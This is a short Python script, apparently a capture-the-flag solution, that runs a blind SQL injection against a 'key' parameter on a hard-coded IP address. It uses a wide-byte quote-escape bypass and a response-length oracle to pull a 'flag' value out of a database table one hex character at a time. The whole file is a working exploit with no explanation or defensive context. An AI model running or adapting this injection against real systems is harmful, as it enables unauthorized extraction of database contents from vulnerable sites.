#!usr/bin/env python
#-*- coding:utf-8 -*-
import requests

url = "http://218.2.197.235:23733/index.php?key="
payload = "-1%df%27||left((select(hex(flag))from(flag)),{pos})=0x{c}%23"
req = requests.session()
flag =''
for i in xrange(1,100):
    for h in xrange(0x00,0xff+1):
        endurl = (url+payload).format(pos = i,c =flag+hex(h)[2:])
        #print endurl
        r = req.get(endurl)
        if len(r.text)>1000:
            flag +=hex(h)[2:]
            print flag
            break

print flag.decode('hex').decode('hex')